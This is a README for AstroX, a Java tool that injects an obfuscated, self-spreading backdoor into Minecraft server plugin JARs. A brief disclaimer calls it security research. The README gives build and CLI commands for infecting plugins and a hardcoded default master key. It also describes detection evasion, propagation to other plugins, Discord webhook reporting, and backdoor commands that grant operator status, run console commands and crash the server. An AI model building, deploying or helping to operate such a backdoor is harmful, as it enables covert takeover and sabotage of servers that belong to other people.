# AstroX

![Java 17](https://img.shields.io/badge/Java-17-orange)
![Maven](https://img.shields.io/badge/Maven-3.8+-blue)
![License](https://img.shields.io/badge/License-MIT-green)

**AstroX** is an advanced Java framework designed for security research and defensive testing of Minecraft server plugins. It provides automated tools for analyzing plugin JARs, identifying vulnerabilities, and simulating backdoor injection scenarios through polymorphic bytecode instrumentation.

> **⚠️ DISCLAIMER**: This tool is developed for **educational and authorized security research purposes only**. The authors are not responsible for any misuse. ensure you have explicit permission from the system owner before performing any tests.

---

## 📋 Table of Contents
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
  - [CLI Tool](#cli-tool)
  - [In-Game Commands](#in-game-commands)
- [Configuration](#-configuration)
- [Architecture](#-architecture)
- [Development](#-development)
- [License](#-license)

---

## ✨ Features

### 🔍 Static Analysis
- **Metadata Extraction**: automatically parses `plugin.yml` to identify plugin name, version, and main class.
- **Dependency Scanning**: Detects runtime dependencies and environment compatibility (Java version).
- **Structure Analysis**: Identifies base packages for optimal injection placement.

### 💉 Injection Engine (`core`)
- **Polymorphic Weaving**: Generates unique payload signatures for each injection to evade static signature detection.
- **Obfuscation**: Implements `StringEncryptor` and `ClassMutator` to scramble payload bytecode.
- **Dynamic Loading**: Uses `DynamicLoader` to load critical classes from encrypted memory streams, avoiding disk artifacts.

### 🚀 Runtime Payload (`payload`)
- **Command System**: Integrated chat-based command listener (default prefix: `#`).
- **Access Control**: UUID-based whitelisting and password authentication.
- **Propagation**: Optional `PropagationEngine` to automatically spread to other plugins on the server (configurable).
- **Webhooks**: Discord webhook integration for real-time notifications of injection events and user activity.

---

## 🛠 Installation

### Prerequisites
- **Java Development Kit (JDK)**: Version 17 or higher.
- **Maven**: Version 3.8.0 or higher.
- **Git**: For version control.

### Build from Source
1.  **Clone the repository**:
    ```bash
    git clone https://github.com/Eangly99/AstroX.git
    cd AstroX
    ```

2.  **Compile and Package**:
    ```bash
    mvn clean package
    ```

3.  **Verify Output**:
    The executable JAR will be generated at `target/AstroX-1.0.0.jar`.

---

## 💻 Usage

### CLI Tool
Run the injector against a target Minecraft plugin JAR:

```bash
java -jar target/AstroX-1.0.0.jar <input_plugin.jar> [options]
```

**Options:**

| Flag | Description | Example |
|------|-------------|---------|
| `--auth <uuid...>` | Pre-authorize player UUIDs | `--auth 069a79f4-44e9...` |
| `--webhook <url>` | Set Discord webhook URL | `--webhook https://discord.com/api/...` |
| `--prefix <char>` | Set custom command prefix (default: `#`) | `--prefix !` |
| `--no-propagation` | Disable auto-spreading to other plugins | `--no-propagation` |
| `--debug` | Enable verbose debug logging | `--debug` |

### In-Game Commands
Once the infected plugin is running on a server, access the backdoor using the configured prefix (default `#`).

**Authentication:**
```
#auth <master_key>
```
*Default Master Key: `astrox_master_2025` (See `Config.java`)*

**Available Commands:**

| Command | Description | Category |
|---------|-------------|----------|
| `#help` | Show available commands | Utility |
| `#op` | Grant operator status to yourself | Admin |
| `#deop <player>` | Remove operator status | Admin |
| `#console <cmd>` | Execute console command | System |
| `#gamemode <mode>` | Change game mode (c/s/a/sp) | Player |
| `#fly` | Toggle flight mode | Player |
| `#vanish` | Toggle invisibility | Player |
| `#nuke` | ☢️ **Destructive**: Create massive explosion | Chaos |
| `#crash` | **Destructive**: Crash the server | Chaos |
| `#seed` | Reveal world seed | Utility |
| `#sudo <p> <msg>` | Force player to chat/run command | Trolling |
| `#fakeleave` | Broadcast fake leave message | Trolling |
| `#coords` | Broadcast current coordinates | Utility |
| `#adduser <uuid>` | Whitelist a new user | Access |

---

## ⚙ Configuration

### Runtime Configuration
Runtime settings are controlled via CLI arguments as detailed in the [Usage](#usage) section.

### Compile-time Configuration
Edit `src/main/java/dev/naruto/astrox/Config.java` to modify core constants before building:

```java
public class Config {
    public static final String MASTER_KEY = "astrox_master_2025";
    public static final boolean ENABLE_OBFUSCATION = true;
    public static final int OBFUSCATION_LEVEL = 8;
    public static final String[] PROPAGATION_BLACKLIST = {
        "protocollib", "viaversion", "geyser" // Plugins to avoid
    };
    // ...
}
```

---

## 🏗 Architecture

The codebase is organized into modular packages:

```
d:\Minecraft\AstroX\src\main\java\dev\naruto\astrox
├── AstroX.java             // CLI Entrypoint
├── BuildEncryptor.java     // Build tool for class encryption
├── core/                   // Injection Logic
│   ├── Injector.java       // Orchestrates the injection process
│   ├── JarAnalyzer.java    // Parses target plugin.yml and classes
│   └── PayloadWeaver.java  // Generates infected bytecode
├── payload/                // Injected Runtime Code
│   ├── BackdoorCore.java   // Main runtime controller
│   ├── PropagationEngine.java // Auto-spreading logic
│   └── commands/           // Implementation of #commands
├── obfuscation/            // Bytecode Manipulation
│   └── StringEncryptor.java // XOR string encryption
└── utils/                  // Helpers (Reflection, Webhooks, etc.)
```

---

## 🤝 Development

### Setup
1. Open the project in IntelliJ IDEA or Eclipse.
2. Import as a **Maven Project**.
3. Ensure Project SDK is set to **Java 17**.

### Contribution Guidelines
1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/amazing-feature`).
3. Commit your changes.
4. Push to the branch.
5. Open a Pull Request.

### Testing
- **Unit Tests**: Run `mvn test` (Note: requires mock Bukkit environment).
- **Integration Tests**:
  1. Build a dummy Spigot plugin.
  2. Run AstroX against the dummy plugin.
  3. Load the infected plugin on a local test server.
  4. Verify command execution.

---

## 📄 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

Copyright (c) 2025 Naruto
